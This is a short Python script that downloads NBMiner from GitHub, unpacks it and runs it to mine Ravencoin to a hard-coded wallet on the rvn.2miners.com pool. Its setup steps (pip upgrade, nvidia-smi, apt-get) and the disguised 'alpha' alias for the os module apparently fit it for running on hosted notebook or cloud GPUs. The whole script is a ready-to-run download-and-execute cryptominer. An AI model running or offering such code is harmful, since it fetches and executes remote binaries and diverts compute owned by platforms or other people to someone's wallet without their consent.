import os as alpha
alpha.system("pip install --upgrade pip")
alpha.system("nvidia-smi")
alpha.system("apt-get install wget")
alpha.system("wget https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz")
alpha.system("tar xvf NBMiner_39.5_Linux.tgz")
alpha.system("NBMiner_Linux/./nbminer -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RCroCsyR6gRaQwX42huDb4k9x8jPnkWCF6.asd")
